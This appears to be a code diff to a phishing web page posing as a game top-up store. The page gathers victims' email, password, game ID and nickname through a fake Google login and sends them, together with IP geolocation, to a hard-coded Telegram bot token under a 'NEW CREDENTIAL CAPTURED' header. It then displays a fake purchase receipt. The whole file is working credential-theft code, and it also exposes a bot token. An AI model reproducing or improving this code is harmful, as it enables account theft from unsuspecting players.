-            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', region: 'Unknown', org: 'Unknown' };
+            let ipData = { ip: 'Unknown', country_name: 'Indonesia', city: 'Manado', region: 'North Sulawesi', org: 'PT Telkom' };
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
@@ -455,16 +484,16 @@
 
             const formattedMessage = `
 📌 NEW CREDENTIAL CAPTURED 📌
-EMAIL : ${email}
-PW : ${password}
-ID : ${fullId}
-GAME : ${currentGame}
-NICKNAME : ${detectedNickname}
-NEGARA : ${ipData.country_name || ipData.country}
-CITY : ${ipData.city}
-STATE : ${ipData.region}
-ASN : ${ipData.org}
-IP ADDRES : ${ipData.ip}
+📧 EMAIL : ${email}
+🔑 PW : ${password}
+🆔 ID : ${fullId}
+🎮 GAME : ${currentGame}
+👤 NICKNAME : ${detectedNickname}
+🌍 REGION : ${ipData.country_name || ipData.country}
+🏙️ CITY : ${ipData.city}
+🏛️ STATE : ${ipData.region}
+🌐 ASN : ${ipData.org}
+💻 IP : ${ipData.ip}
             `.trim();
 
             const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
@@ -479,17 +508,38 @@ IP ADDRES : ${ipData.ip}
             } catch(err) {}
 
             document.getElementById('google-modal').style.display = 'none';
-            document.getElementById('rEmail').innerText = email;
-            document.getElementById('rPass').innerText = password;
-            document.getElementById('rId').innerText = fullId;
-            document.getElementById('rNick').innerText = detectedNickname;
-            document.getElementById('rCountry').innerText = ipData.country_name || ipData.country || 'Indonesia';
-            document.getElementById('rCity').innerText = ipData.city || 'Tondano';
-            document.getElementById('rState').innerText = ipData.region || 'North Sulawesi';
-            document.getElementById('rAsn').innerText = ipData.org || 'PT Telkom/XL';
-            document.getElementById('rIp').innerText = ipData.ip || '127.0.0.1';
             
+            // Fill Receipt Data with Copy feature
+            fillCopyRow('rNoTrans', noTrans);
+            fillCopyRow('rId', fullId);
+            fillCopyRow('rNick', detectedNickname);
+            fillCopyRow('rItem', `${currentItemObj.name} (${currentItemObj.sub})`);
+            fillCopyRow('rOrigPrice', currentItemObj.orig);
+            fillCopyRow('rDate', now);
+            fillCopyRow('rEmail', email);
+            fillCopyRow('rCountry', ipData.country_name || ipData.country || 'Indonesia');
+
             document.getElementById('invoice-screen').style.display = 'flex';
+        }
+
+        function fillCopyRow(elementId, textValue) {
+            const el = document.getElementById(elementId);
+            el.innerHTML = `${textValue} <i class="fa-regular fa-copy" style="cursor:pointer; margin-left:6px; color:var(--primary);" title="Salin" onclick="navigator.clipboard.writeText('${textValue}'); alert('Disalin: ${textValue}');"></i>`;
+        }
+
+        function toggleReceiptDetail() {
+            const box = document.getElementById('receiptDetailsBox');
+            const btn = document.getElementById('btnDetailText');
+            box.classList.toggle('show');
+            const isShow = box.classList.contains('show');
+            const lang = document.getElementById('langSelect').value;
+            if (lang === 'en') {
+                btn.innerText = isShow ? "Hide Receipt Detail" : "View Receipt Detail";
+            } else if (lang === 'ms') {
+                btn.innerText = isShow ? "Sembunyikan Resit" : "Lihat Detail Resit";
+            } else {
+                btn.innerText = isShow ? "Sembunyikan Detail Struk" : "Lihat Detail Struk";
+            }
         }
 
         // BANNER SLIDER ANIMATION & SCROLL LOGIC
@@ -525,6 +575,3 @@ IP ADDRES : ${ipData.ip}
     </script>
 </body>
 </html>
-halo mas👋
-bantu save nomorku Shinji Hirako ya
-Kalo udh jempol in aj, nomormu udah ku save
